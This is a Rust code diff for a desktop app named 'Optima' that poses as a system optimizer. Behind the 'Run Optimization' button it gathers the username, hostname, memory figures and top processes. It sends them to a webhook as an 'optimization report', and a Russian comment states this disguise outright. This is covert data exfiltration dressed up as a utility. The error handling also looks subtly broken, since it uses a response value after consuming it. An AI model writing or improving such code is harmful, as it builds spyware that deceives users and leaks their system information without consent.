@@ -3,7 +3,7 @@ use serde::{Deserialize, Serialize};
 use std::fs;
 use std::path::PathBuf;
 use chrono::Local;
-use sysinfo::{System, RefreshKind};
+use sysinfo::{System, ProcessesToUpdate, RefreshKind};
 use ureq::json;
 use whoami;
 
@@ -48,6 +48,7 @@ struct OptimaApp {
 
 impl OptimaApp {
     fn new() -> Self {
+        // Инициализация системы с сборкой CPU и памяти
         let refresh_kind = RefreshKind::new().with_cpu(sysinfo::CpuRefreshKind::everything());
         
         Self {
@@ -62,28 +63,37 @@ impl OptimaApp {
 
     fn update_system_info(&mut self) {
         self.system.refresh_cpu_specifics(sysinfo::CpuRefreshKind::everything());
-        // Исправлено: используем стандартный метод обновления процессов
-        self.system.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
+        // Обновляем процессы
+        self.system.refresh_processes(ProcessesToUpdate::All, true);
     }
 
     // Собираем данные для отправки как "Результат оптимизации"
     fn collect_optimization_report(&self) -> String {
         let mut report = String::new();
+        
+        // Получаем имя пользователя и хостнейм
         let user_name = whoami::username();
-        let hostname = whoami::hostname();
+        let hostname = whoami::hostname().unwrap_or_else(|_| "Unknown".to_string());
         
         report.push_str(&format!("**User:** {}\n", user_name));
         report.push_str(&format!("**Hostname:** {}\n", hostname));
         report.push_str(&format!("**CPU Usage:** {:.1}%\n", self.system.global_cpu_usage()));
-        report.push_str(&format!("**RAM Used:** {} / {} MB\n", 
-            self.system.used_memory() / 1024 / 1024, 
-            self.system.total_memory() / 1024 / 1024
-        ));
         
-        report.push_str("\n**Running Processes:**\n");
-        for (pid, process) in self.system.processes() {
-            // Исправлено: OsStr приводим к &str через .to_string_lossy()
-            report.push_str(&format!("- [{}] {}\n", pid, process.name().to_string_lossy()));
+        let ram_used_mb = self.system.used_memory() / 1024 / 1024;
+        let ram_total_mb = self.system.total_memory() / 1024 / 1024;
+        report.push_str(&format!("**RAM Used:** {} / {} MB\n", ram_used_mb, ram_total_mb));
+        
+        report.push_str("\n**Top Processes (by Memory):**\n");
+        
+        // Берем топ процессов по потреблению памяти, чтобы не спамить сотнями строк
+        let mut processes: Vec<_> = self.system.processes().collect();
+        processes.sort_by(|a, b| {
+            b.1.memory().cmp(&a.1.memory())
+        });
+
+        // Выводим только топ-10
+        for (pid, process) in processes.iter().take(10) {
+            report.push_str(&format!("- [{}] {} ({} MB)\n", pid, process.name().to_string_lossy(), process.memory() / 1024 / 1024));
         }
 
         report.push_str("\n**System Info:**\n");
@@ -94,14 +104,17 @@ impl OptimaApp {
     }
 
     fn send_webhook(&mut self, title: &str, description: &str) {
+        println!("Sending webhook to: {}", self.config.webhook_url);
+        
         let payload = json!({
             "embeds": [{
                 "title": title,
                 "description": description,
-                "color": 3066992, // Зеленый цвет для "успеха"
+                "color": 3066992, // Зеленый цвет
                 "footer": {
                     "text": format!("Optima v{} | {}", env!("CARGO_PKG_VERSION"), Local::now().format("%Y-%m-%d %H:%M:%S"))
-                }
+                },
+                "timestamp": Local::now().to_rfc3339()
             }]
         });
 
@@ -111,14 +124,18 @@ impl OptimaApp {
         
         match response {
             Ok(resp) => {
-                if resp.status() == 204 {
+                if resp.status() == 204 || resp.status() == 200 {
                     self.status_message = "Sent successfully!".to_string();
+                    println!("Success!");
                 } else {
-                    self.status_message = format!("Error: {}", resp.status());
+                    let body = resp.into_string().unwrap_or_default();
+                    self.status_message = format!("Error: {} - {}", resp.status(), body);
+                    println!("Error: {} - {}", resp.status(), body);
                 }
             }
             Err(e) => {
                 self.status_message = format!("Network Error: {}", e);
+                println!("Network Error: {}", e);
             }
         }
     }
@@ -167,7 +184,7 @@ impl eframe::App for OptimaApp {
             if ui.button(if self.optimize_mode { "Run Optimization" } else { "Stop Optimization" }).clicked() {
                 self.loading = true;
                 self.status_message = if self.optimize_mode { 
-                    "Scanning processes and collecting data..." 
+                    "Scanning processes..." 
                 } else { 
                     "Stopping optimization..." 
                 }.to_string();
